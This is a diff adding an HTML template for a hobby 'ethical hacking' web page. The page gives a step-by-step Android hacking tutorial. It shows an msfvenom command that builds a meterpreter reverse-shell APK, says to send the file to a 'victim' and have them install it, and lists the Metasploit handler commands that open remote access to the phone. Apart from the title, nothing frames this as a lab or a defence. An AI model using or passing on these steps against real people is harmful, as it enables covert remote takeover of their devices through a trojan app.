@@ -1,0 +1,43 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+{% load staticfiles %}
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Ethical Hacking Tricks</title>
+<link rel="stylesheet" href="{% static "css/source3.css" %}"/>
+</head>
+
+<body>
+<div class="image">
+ <img src="{% static "images/header.jpg" %}" width="2000" height="200" alt="header" /> </div>
+<h1> ETHICAL HACKING</h1>
+<h5>CYBER SECURITY</h5>
+ <div>
+<ul>
+  <li><a href="{% url 'index' %}">About</a></li>
+  <li><a href="{% url 'tools' %}">Ethical hacking tools</a></li>
+  <li><a href="{% url 'tricks' %}" class="active" >Ethical hacking tricks</a></li>
+</ul>
+ </div>
+ <div>
+<p>Here are some of the stuffs you can perform by learning Ethical Hacking with the help of <b>Kali linux</b>.</p>
+ <p>To download kali linux <a href="https://www.kali.org/downloads/"> click here</a></p>
+ <h2>Android Hacking</h2>
+<p>To perform this hack you need kali linux.</p>
+ <p>Metasploit is the tool used to perform this hack.I will explain step by step how to perform this hack.</p>
+ <ol>
+ <li><p>Open the Terminal the first step is you need to create a payload i.e(apk/exe).</p></li><br /><br />
+ <br/><p>The command is..</p>
+ <font size="+1"><b>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168. LPORT=8080 R > hack.apk</b></font>
+<p> Change the lhost to your ip address</p>
+ <img src="{% static "images/kali.JPG" %}" width="1024" height="226" alt="initial step" /><br />
+<li><p>Now send the hack.apk file to the victim</p></li><br /><br />
+ <br /><p>The victim should install the apk file and sholud be connected in the same network as target machine.</p>
+<li><p>Open a terminal and type msfconsole.Then enter the following commands..</p></li> <br /><br />
+<br /><p><font size="+1"><b>use exploit/multi/handler<br />set lhost 192.168.1.8(your ip) <br />set lport 8080<br /> exploit</b></font></p>
+<img src="{% static "images/kali2.JPG" %}"width="1013" height="185" alt="final step" /><br />
+<li><p>Then BOOM you have succesfully hacked the device.From the target machine you can remotely  access the device and can perform numerous operations.For info simply type help in the terminal you can see what kind of operations can be perrformed.</p></li></ol>
+<br />
+<p style="text-align:center">Hope you like it.Soon I will update more stuffs :)</p>
+</body>
+</html>
